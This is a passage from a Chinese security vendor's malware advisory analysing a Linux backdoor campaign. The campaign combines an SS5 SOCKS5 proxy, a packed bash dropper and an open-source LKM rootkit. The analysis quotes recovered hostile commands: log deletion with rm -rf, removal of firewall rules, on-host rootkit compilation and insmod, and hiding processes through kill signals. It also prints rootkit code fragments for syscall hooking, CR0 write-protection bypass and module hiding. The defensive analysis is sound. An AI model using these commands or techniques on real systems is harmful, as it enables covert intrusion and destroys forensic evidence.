---
title: 【恶意文件通告】Linux多功能病毒分析
url: https://mp.weixin.qq.com/s/Zq8Yo1-czb-X358CnBuUNA
source: Doonsec's feed
date: 2026-05-12
fetch_date: 2026-05-13T05:44:50.996051
---

# 【恶意文件通告】Linux多功能病毒分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/APc6NwjLsxT8u1SGCQ69UscNAq2miariapPdia3Vl1kCMZXzX91tPdiard6A7T6d0LLFKmDg98bGlZBtdxJou1AP9zxia0BjeyokJb7Ije5GicyT8/0?wx_fmt=jpeg)

# 【恶意文件通告】Linux多功能病毒分析

深瞻情报实验室
深瞻情报实验室

深信服千里目安全技术中心

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/APc6NwjLsxQq6hpd45HpD2J8DyTvGFFz2AG6eXl4bexWvFx2pHyoH1nyQGNd3miatZISbwJc4lCTEH56kpgyu6Mg1HQ2EwjuB4ibOBETUDPKs/640?wx_fmt=gif&from=appmsg)

近期，深信服千里目安全技术中心监测到一起Linux后门事件、经过深度分析排查发现该事件与UTG-Q-008团伙存在关联，该家族是针对Linux平台的威胁行为者，主要针对中国政府机构和企业实体，利用庞大的僵尸网络进行间谍活动。

**恶意文件概要**

|  |  |
| --- | --- |
| **恶意文件****名称** | **Linux多功能病毒分析** |
| **发布时间** | **2026****年****5****月****12****日** |
| **威胁****类型** | **Rootkit****、后门、D****DoS****、僵尸网络** |
| **简单描述** | **攻击者通过多个恶意文和开源软件的组合利用实现实现内核Rootkit隐藏、后门部署、僵尸网络搭建和流量代理转发等多种高危害行为。** |

**恶意文件分析**

![](https://mmbiz.qpic.cn/mmbiz_gif/APc6NwjLsxQx6ev48HNDZicSvXL9AlG4AAEgCiaGPlibwNicItrHRAe1GjnHnS1NL9T4ltiavsNE7nBDUEP3Pdgak9l9o4n0xToXvHLlrvCLv5jA/640?wx_fmt=gif&from=appmsg)

**恶意文件描述**

近期，深信服千里目安全技术中心监测到一起Linux后门事件、经过深度分析排查发现该事件与UTG-Q-008团伙存在关联，该家族是针对Linux平台的威胁行为者，主要针对中国政府机构和企业实体，利用庞大的僵尸网络进行间谍活动。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/APc6NwjLsxRMdJHQbao4y0EMLjxcxsG4rycsMcBgxlNqfibG1mBsZ6XP5VpX1MwIl6uhddok9EFcSazpmNSDHD9nh46KXuCEHJzd8gVYTUxg/640?wx_fmt=gif&from=appmsg)

**恶意文件分析**

此次攻击一共发现三个文件，涵盖了代理转发、权限维持、漏洞扫描和利用、DDos、后门等常见的操作。

**1.dnsresolve**

该样本为SS5 Socks Server Version 3.8.9 - Release 8，是一个开源 SOCKS5 代理服务器软件。使用gcc (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)进行编译，主要包含了如下功能：

|  |  |  |  |
| --- | --- | --- | --- |
| **函数名** | **地址** | **大小** | **功能** |
| main | 0x4208800 | 2840 | 程序入口，参数解析，环境变量处理 |
| S5Core | 0x4214096 | 15470 | 核心 SOCKS5 代理处理逻辑（最大函数） |
| S5SetStatic | 0x4231088 | 1371 | 初始化静态配置默认值 |
| S5LoadConfig | 0x4248400 | 505 | 加载配置文件并触发模块加载 |
| S5LoadConfData | 0x4236512 | 9924 | 解析配置文件（auth/proxy/bandwidth/route等） |
| S5LoadModules | 0x4251264 | 3662 | 动态加载 .so 模块 |
| S5LoadPeers | 0x4236016 | 496 | 加载对等节点配置 |
| S5PropagateConfig | 0x4246448 | 1254 | 向对等节点传播配置 |
| S5ReceiveConfig | 0x4247712 | 678 | 接收来自主节点的配置 |
| S5MainThread | 0x4248976 | 378 | 主线程循环，接受连接 |
| S5ServerMake | 0x4230320 | 345 | 创建监听 socket |
| S5ServerAccept | 0x4230144 | 168 | 接受客户端连接 |
| S5MakeDaemon | 0x4230672 | 61 | 守护进程化（fork→setsid→fork→chdir→umask） |
| S5UIDSet | 0x4230736 | 177 | 降权操作（getpwnam→setgid→initgroups→setuid） |
| DirectoryQuery | 0x4254928 | 3455 | LDAP 目录查询认证 |
| DirectoryCheck | 0x4258384 | 514 | 目录认证检查 |
| S5RadiusAuth | 0x4261552 | 2741 | RADIUS 认证 |
| S5RadiusAcct | 0x4258912 | 2633 | RADIUS 计费 |
| S5GetIf | 0x4234656 | 710 | 获取网络接口信息 |
| S5GetRange | 0x4233056 | 255 | 解析 IP 范围 |
| S5GetNetmask | 0x4233312 | 180 | 解析网络掩码 |
| S5StrHash | 0x4232992 | 57 | 字符串哈希 |
| S5Debug\* 系列 | - | - | 调试/日志输出函数 |

**启动流程：**

1. 初始化默认配置: 监听地址 `0.0.0.0:1080`，运行用户 `nobody`

2. 检查环境变量并覆盖配置（`SS5\_SOCKS\_USER`, `SS5\_SOCKS\_PORT`, `SS5\_SOCKS\_ADDR` 等）

3. 解析命令行参数

4. 加载 `.so` 模块（`S5LoadModules`）

5. 加载配置文件（`S5LoadConfig`）

6. 守护进程化（`S5MakeDaemon`）

7. 降权运行（`S5UIDSet`）

8. 进入主循环（`S5Core` / `S5MainThread`）

**2.59a515e28d1515ae**

该文件是一个从bash脚本打包的ELF文件，包含了自解压、socks5、内核级Rookit三个组件协同工作。核心函数如下:

|  |  |  |
| --- | --- | --- |
| **函数** | **地址** | **功能** |
| sub\_402354 | 0x4203348 | 初始化对象 (XOR 解码 /proc/self/exe 路径) |
| sub\_4046E0 | 0x4212448 | 初始化参数解析对象 |
| sub\_404A3A | 0x4213306 | XOR 解码包装 (调用 sub\_4059E4, key=0x2E) |
| sub\_474AD0 | 0x4672208 | readlink() 系统调用包装— 读取 /proc/self/exe 获取自身路径 |
| sub\_4743B0 | 0x4670384 | 自定义realpath() — 通过 inode 向上爬升目录树解析绝对路径 |
| sub\_40E1F0 | 0x4248016 | std::string 子串赋值 |
| sub\_404BB2 | 0x4213682 | 字符串后缀匹配 (检查文件扩展名) |
| sub\_40D3E0 | 0x4249568 | 字符串搜索 (在 shebang 中查找解释器名) |
| sub\_42D0A0 | 0x4366496 | setenv() — 设置环境变量 |
| sub\_404EAA | 0x4214442 | Shell 执行包装 (v63=0) |
| sub\_404F48 | 0x4214600 | Python 执行包装 (v63=1) |
| sub\_404FE6 | 0x4214758 | Perl/Node/Ruby 执行包装 (v63=2,3,4) |
| sub\_405084 | 0x4214916 | PHP/Lua 执行包装 (v63=5,7) |
| sub\_405122 | 0x4215074 | Rscript 执行包装 (v63=6) |
| sub\_46CBE0 | 0x4639728 | 核心进程执行— PATH 查找解释器 → execve |

文件执行之后从自身解密出需要执行的bash代码，在bash代码中包含了如下几个核心的恶意逻辑：

**反取****证**

rm -rf /var/www/html/config.json          # 删除 Web 服务器配置
rm -rf /root/.xmrig.json                  # 删除 XMRig 矿工配置
rm -rf /root/.config/xmrig.json           # 删除 XMRig 备用配置
rm -rf /var/log/messages\*                 # ★ 摧毁系统日志
rm -rf /var/log/secure\*                   # ★ 摧毁安全审计日志
rm -rf /var/log/auth.log\*                 # ★ 摧毁认证日志
rm -rf /var/log/syslog\*                   # ★ 摧毁 syslog

摧毁系统审计日志, 使入侵检测和安全分析失效。删除别的挖矿程序配置。

**系统调优 + 防火墙规避**

提高系统资源上限 (为挖矿优化)

echo "fs.file-max = 2097152" > /etc/sysctl.conf   # 写入内核参数
sysctl -p                                          # 立即生效
ulimit -SHn 1024000                                # 提高进程文件句柄上限

隐藏 iptables 二进制

mv /usr/sbin/tokens /usr/sbin/iptables     # "恢复" iptables (tokens → iptables)
mv /sbin/tokens /sbin/iptables             # 同上

脚本假设系统管理员已将 iptables 重命名为 tokens 以阻止恶意软件使用。脚本将其"恢复正常", 然后操纵防火墙规则, 最后再隐藏:

mv /usr/sbin/iptables /usr/sbin/tokens     # 再次隐藏 iptables
mv /sbin/iptables /sbin/tokens

移除已知矿池 C2 的防火墙封锁,脚本搜索并删除针对以下 IP 段的 INPUT DROP 规则:

|  |  |
| --- | --- |
| **IP段** | **提供商** |
| 138.68.0.0/16 | DigitalOcean |
| 67.207.0.0/16 | DigitalOcean |
| 46.101.0.0/16 | DigitalOcean |
| 157.245.0.0/16 | DigitalOcean |
| 146.190.0.0/16 | DigitalOcean |
| 144.126.0.0/16 | DigitalOcean |
| 167.172.0.0/16 | DigitalOcean |
| 172.104.0.0/16 | Linode |
| 172.105.0.0/16 | Linode |

iptables -L INPUT -v -n | grep <IP> | awk '{print $8}' | xargs -rL1 iptables -D INPUT -j DROP -s

**部署 LKM Rootkit (cloud\_monitor)**

这是最危险的组件。脚本内嵌完整 C 语言内核模块源码, 在目标机器上现场编译并加载。

**编译流程**

mkdir /tmp/b
# 写入 cloud\_monitor.h (宏定义)
# 写入 cloud\_monitor.c (约 400 行内核模块代码)
# 写入 Makefile
make -C /lib/modules/`uname -r`/build M=/tmp/b modules
insmod /tmp/b/cloud\_monitor.ko
rm -rf /tmp/b     # 清理编译痕迹

被挂钩的系统调用

|  |  |
| --- | --- |
| **系统调用** | **挂钩后行为** |
| getdents | 过滤目录列表中的隐藏条目 |
| getdents64 | 同上 (64位版本) |
| kill | 拦截自定义信号, 实现后门功能 |

自定义后门信号

|  |  |  |
| --- | --- | --- |
| **信号** | **编号** | **功能** |
| SIGINVIS | 41 | 设置进程PF\_INVISIBLE 标志→ 从 ps/top//proc 中隐藏进程 |
| SIGSUPER | 54 | 修改 cred 结构 → 直接获取 root 权限 (uid=0,gid=0,suid=0,...) |
| SIGMODINVIS | 53 | 从内核模块链表list\_del → 从 lsmod 中隐藏自身 |

文件/目录隐藏：任何以 $hhide (默认 ad12e85f) 为前缀的文件/目录在 ls/find/readdir 中不可见:

#define MAGIC\_PREFIX "ad12e85f"
// 在 hacked\_getdents 中:
if (memcmp(MAGIC\_PREFIX, dir->d\_name, strlen(MAGIC\_PREFIX)) == 0) {
    // 从返回结果中移除此条目
}

同时, 以数字命名的进程 ID 也会在 /proc 中被隐藏 (通过 is\_invisible 检查 PF\_INVISIBLE 标志)。

内存保护绕过

// x86/x86\_64: 修改 CR0 寄存器绕过写保护
cr0 = read\_cr0();
unprotect\_memory();   // write\_cr0(cr0 & ~0x00010000)
// 修改系统调用表...
protect\_memory();     // write\_cr0(cr0)

// ARM64: 直接修改页表权限
update\_mapping\_prot(phys, virt, size, PAGE\_KERNEL);

自隐藏技术

// 从内核模块链表中删除自身
module\_hide() {
    module\_previous=THIS\_MODULE->list.prev;
    list\_del(&THIS\_MODULE->list);     // 从 lsmod 不可见
}

// 删除 sect\_attrs 防止 sysfs 暴露
tidy() {
    kfree(THIS\_MODULE->sect\_attrs);
    THIS\_MODULE->sect\_attrs=NULL;   // /sys/module/ 不可见
}

Rootkit 元数据

|  |  |
| --- | --- |
| **属性** | **值** |
| 模块名 | cloud\_monitor (伪装云监控) |
| 许可证 | "Dual BSD/GPL" (虚假) |
| 作者 | m0nad (开源 LKM rootkit 作者) |
| 描述 | "LKM rootkit" |
| 兼容内核 | Linux 2.6.18 ~ 5.7+ (支持 x86\_64、ARM64) |

部署 SS5 SOCKS5 代理

# 从隐藏在 /etc/$hhide/ 的 dnsresolve 复制 SS5 代理
cp /etc/ad12e85f/dnsresolve /$EXE    # $EXE = md5sum($RANDOM)[:8]

# 以静默、线程模式启动 SS5 SOCKS5 代理
/$EXE-m-t-p /usr/share/terminfo/w/wy66-qa -b0.0.0.0:$port

# 删除可执行文件 (进程仍在内存中运行)
rm-rf /$EXE

# 通过 rootkit 信号隐藏 SS5 进程
kill-41`cat /usr/share/terminfo/w/wy66-qa`

# 通过 rootkit 信号隐藏内核模块
kill-5310000000

SS5 配置

|  |  |
| --- | --- |
| **参数** | **说明** |
| -m | 静默模式 (不输出日志) |
| -t | 线程模式 |
| -p | PID 文件路径 (/usr/share/terminfo/w/wy66-qa) |
| -b | 绑定地址:端口 (0.0.0.0:$port) |
| 默认端口 | 由脚本$1 参数决定 |

伪装路径

SS5 PID 文件: /usr/share/terminfo/w/wy66-qa (伪装成 terminfo 数据库条目)

SS5 可执行文件: 随机 8 字符 MD5 前缀, 执行后立即删除

SS5 原始文件: /etc/$hhide/dnsresolve (被 rootki...